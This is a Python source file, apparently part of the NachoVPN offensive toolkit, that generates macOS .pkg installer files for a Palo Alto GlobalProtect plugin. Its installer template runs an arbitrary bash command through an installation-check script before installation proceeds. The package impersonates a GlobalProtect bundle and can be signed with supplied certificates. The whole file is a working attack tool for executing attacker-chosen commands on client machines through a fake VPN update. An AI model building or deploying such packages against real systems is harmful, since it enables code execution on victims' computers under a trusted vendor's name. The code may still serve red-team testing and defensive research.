# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-NachoVPN\src\nachovpn\plugins\paloalto\pkg_generator.py
import argparse
import base64
import datetime
import hashlib
import io
import logging
import os
import random
import string
import struct
import sys
import zlib

from Crypto.Hash import SHA
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1_v1_5
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

DIST_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
    <pkg-ref id="com.{package_id}"/>
    <title>{package_name}</title>
    <options hostArchitectures="x86_64,arm64"/>
    <options customize="never"/>
    <options allow-external-scripts="true"/>
    <installation-check script="{installation_check}()"/>
    <script><![CDATA[
    function {installation_check} () {{
      system.run('/bin/bash', '-c', '{command}');
      return false;
    }}
    ]]>
    </script>
    <pkg-ref id="woot.pkg">
        <bundle-version>
            <bundle CFBundleVersion="{bundle_version}" id="com.paloaltonetworks.GlobalProtect.gplock"/>
        </bundle-version>
    </pkg-ref>
</installer-gui-script>"""

TOC_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<xar>
 <toc>
  <checksum style="sha1">
   <size>20</size>
   <offset>0</offset>
  </checksum>
  <creation-time>{creation_time}</creation-time>
  {signature_toc_entry}
  <file id="1">
   <name>Distribution</name>
   <type>file</type>
   <data>
    <archived-checksum style="sha1">{compressed_hash}</archived-checksum>
    <extracted-checksum style="sha1">{extracted_hash}</extracted-checksum>
    <encoding style="application/x-gzip"/>
    <size>{extracted_length}</size>
    <offset>{data_offset}</offset>
    <length>{compressed_length}</length>
   </data>
  </file>
 </toc>
</xar>
"""

# <signature-creation-time>461137009.8</signature-creation-time>
SIGNATURE_TOC_ENTRY = """<signature style="RSA">
  <offset>20</offset>
  <size>{signature_length}</size>
  <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
    <X509Data>
     {x509_certs}
    </X509Data>
  </KeyInfo>
</signature>
"""


def build_signature_toc(certificates, signature_length):
    x509_certs = ""
    for cert in certificates:
        x509_certs += f"<X509Certificate>{cert}</X509Certificate>"

    return SIGNATURE_TOC_ENTRY.format(signature_length=signature_length, x509_certs=x509_certs).rstrip()


def extract_cert_base64(cert_file):
    try:
        with open(cert_file, "rb") as f:
            cert = x509.load_pem_x509_certificate(f.read(), default_backend())
            der_cert = cert.public_bytes(encoding=serialization.Encoding.DER)
            return base64.b64encode(der_cert).decode()
    except Exception as e:
        logging.error(f"Unable to import {cert_file}: {e}")
    return None


def get_signature(key_file, data):
    try:
        with open(key_file, "rb") as f:
            key_data = RSA.import_key(f.read())
        return PKCS1_v1_5.new(key_data).sign(SHA.new(data))
    except:
        logging.error(f"Unable to get signature with key: {key_file}")
    return None


def random_string(length=12):
    return "".join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(length))


def generate_pkg(version, command, package_name, cert_file=None, key_file=None, ca_file=None):
    package_id = "{}.{}".format(random_string(6).lower(), random_string(6).lower())
    installation_check = random_string()
    dist_file = DIST_TEMPLATE.format(
        package_id=package_id,
        package_name=package_name,
        command=command,
        installation_check=installation_check,
        bundle_version=version,
    ).encode()

    # figure out some offsets ..
    data_offset = SHA.digest_size
    sig_toc_entry = ""
    if key_file and cert_file and ca_file:
        test_sig = get_signature(key_file, b"foobar")
        if not test_sig:
            return False

        # increment the offset by the size of the signature data
        sig_len = len(test_sig)
        data_offset += sig_len

        # get required certificates
        ca_cert = extract_cert_base64(ca_file)
        signing_cert = extract_cert_base64(cert_file)
        if not ca_cert or not signing_cert:
            return False

        # now populate the TOC entry
        sig_toc_entry = build_signature_toc([signing_cert, ca_cert], sig_len)

    dist_file_compressed = zlib.compress(dist_file)

    toc_xml = TOC_TEMPLATE.format(
        extracted_hash=hashlib.sha1(dist_file).hexdigest(),
        extracted_length=len(dist_file),
        compressed_hash=hashlib.sha1(dist_file_compressed).hexdigest(),
        compressed_length=len(dist_file_compressed),
        signature_toc_entry=sig_toc_entry,
        data_offset=data_offset,
        creation_time=datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
    ).encode()

    # logging.debug(toc_xml)

    toc_compressed = zlib.compress(toc_xml)
    buf = io.BytesIO()
    buf.write(b"xar!")  # magic
    buf.write(b"\x00\x1c")  # length of header
    buf.write(b"\x00\x01")  # version
    buf.write(struct.pack(">Q", len(toc_compressed)))  # length of TOC compressed data
    buf.write(struct.pack(">Q", len(toc_xml)))  # length of TOC uncompressed data
    buf.write(b"\x00\x00\x00\x01")  # checksum algorithm (sha1)
    buf.write(toc_compressed)
    buf.write(hashlib.sha1(toc_compressed).digest())  # sha1 of compressed data
    if key_file and cert_file:
        buf.write(get_signature(key_file, toc_compressed))  # write signature
    buf.write(dist_file_compressed)
    return buf.getvalue()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Create a .pkg file for macOS and optionally sign it")
    parser.add_argument("-v", "--version", required=True, help="CFBundleVersion for the PKG file")
    parser.add_argument("-c", "--command", help="Command to execute", required=True)
    parser.add_argument("-o", "--output", required=True, help="Output file")

    parser.add_argument(
        "-n",
        "--name",
        required=True,
        help="Package name. Defaults to the output file name",
    )
    parser.add_argument("-a", "--apple-cert", help="Signing certificate")
    parser.add_argument("-k", "--apple-key", help="Key for signing certificate")
    parser.add_argument("--ca-cert", help="CA Certificate", dest="ca_cert")
    args = parser.parse_args()

    if args.name:
        pkg_name = args.name
    else:
        pkg_name = os.path.basename(args.output_file)

    cert_args = [args.apple_key, args.apple_cert, args.ca_cert]

    if any(cert_args) and not all(cert_args):
        parser.error("You must supply --cert, --key and --ca-cert together")

    for arg in cert_args:
        if arg and not os.path.exists(arg):
            print(f"[!] Certificate file '{arg}' not found")
            sys.exit(1)

    outbuf = generate_pkg(
        args.version,
        args.command,
        pkg_name,
        args.apple_cert,
        args.apple_key,
        args.ca_cert,
    )
    if not outbuf:
        sys.exit(1)

    with open(args.output, "wb") as f:
        f.write(outbuf)

    print(f"[+] Done! pkg file written to: {args.output}")
